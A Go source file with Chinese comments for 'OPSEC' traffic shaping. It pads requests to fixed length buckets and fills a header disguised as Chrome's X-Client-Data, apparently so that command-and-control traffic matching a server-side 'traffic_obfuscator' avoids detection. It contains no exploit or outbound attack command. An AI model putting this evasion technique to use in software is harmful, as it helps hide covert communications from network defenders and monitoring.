package communication

import (
	"crypto/rand"
	"encoding/base64"
)

// ===== 流量体积整形（OPSEC 阶段二）=====
//
// 要解决的问题：原来的 `applyRequestPadding` 给每个请求加一个
// `X-Client-Data: <32~127 个随机 ASCII 字符>` ——
//   1. **长度随机**，只是把"定长指纹"换成了"随机长度指纹"，对长度分析毫无帮助；
//   2. 值是小写字母/数字/`-._~` 的随机串，而真实 Chrome 的 X-Client-Data 是
//      **标准 base64** 的定长 blob —— 形态本身就不像浏览器。
//
// 本模块把两件事做对：
//   - **定长**：填充长度由"载荷长度 + 目标桶"决定，而不是纯随机；
//     无载荷的探测请求固定用 minPadLen（与服务端 `{{RAND:40}}` 模板对齐）。
//   - **形态**：值用标准 base64 字符集，长度固定后与真实头部形态一致。
//
// 边界要写清：这是**体积整形**，不是加密。它让"同一类请求长度相同"成立，
// 从而削弱基于长度的分类；但对方仍能看到请求数量与时序。

const (
	// PaddingHeader 填充头名。
	// 用 X-Client-Data 而不是自造的怪名字：它是 Chrome 真实会发的头，
	// 出现在流量里不显眼；服务端 traffic_obfuscator 的模板也用同一个名字。
	PaddingHeader = "X-Client-Data"

	// MinPadLen 最小填充长度（字节）。
	// 40 与服务端 traffic_obfuscator 的 `{{RAND:40}}` 一致 —— 两边不一致的话，
	// 服务端伪装的头部长度与客户端实际发出的长度会对不上。
	MinPadLen = 40

	// MaxPadLen 单次填充上限，防止超大包被填充到离谱的体积
	MaxPadLen = 4096
)

// PadBuckets 长度分桶（2 的幂）。
//
// 选 2 的幂而不是等距区间：真实流量里小请求占绝大多数，
// 2 的幂桶在小尺寸上更细（512/1024），对常见的命令响应区分度更高。
var PadBuckets = []int{512, 1024, 2048, 4096, 8192}

// PaddingValueFor 计算应使用的填充长度（字节）。
//
// payloadLen 是该请求里已知的可变载荷长度（如加密后的 MetaInfo 或 b64 包）；
// 传 <=0 表示"没有载荷"（探测类请求），此时返回 MinPadLen。
//
// 规则：
//  1. 找最小的桶 b，使 payloadLen + pad 不超过 b 且 pad >= MinPadLen；
//     即 pad = b - payloadLen，取第一个满足 pad >= MinPadLen 的桶
//  2. 载荷超过最大桶时返回 MinPadLen —— 此时再补齐意义不大，
//     反而让超大包更大（带宽与可疑度都上升）
func PaddingValueFor(payloadLen int) int {
	if payloadLen <= 0 {
		return MinPadLen
	}
	for _, b := range PadBuckets {
		pad := b - payloadLen
		if pad >= MinPadLen {
			if pad > MaxPadLen {
				return MaxPadLen
			}
			return pad
		}
	}
	return MinPadLen
}

// BuildPadding 生成指定长度的 base64 风格填充值。
//
// 用标准 base64 字符集（A-Za-z0-9+/=）而不是 URL 安全集：
// Chrome 的 X-Client-Data 是标准 base64，形态要一致。
//
// n<=0 时返回空串（调用方据此跳过设置头部）。
func BuildPadding(n int) string {
	if n <= 0 {
		return ""
	}
	// 用 crypto/rand：填充值不该有可预测性（可预测的填充等于没有填充）
	raw := make([]byte, n)
	if _, err := rand.Read(raw); err != nil {
		// 随机源失败：退化为用固定字符填满，仍然保证长度正确
		// （长度整形是主要目的，随机性只是附带；但绝不返回短于 n 的值）
		for i := range raw {
			raw[i] = 'A'
		}
		return base64.StdEncoding.EncodeToString(raw)[:n]
	}
	out := base64.StdEncoding.EncodeToString(raw)
	if len(out) >= n {
		return out[:n]
	}
	// base64 编码后长度必然 >= n*4/3 > n，这里只是防御
	return out + base64.StdEncoding.EncodeToString(make([]byte, n-len(out)))[:n-len(out)]
}

// PaddingForRequest 便捷封装：按载荷长度算长度并生成值。
func PaddingForRequest(payloadLen int) string {
	return BuildPadding(PaddingValueFor(payloadLen))
}
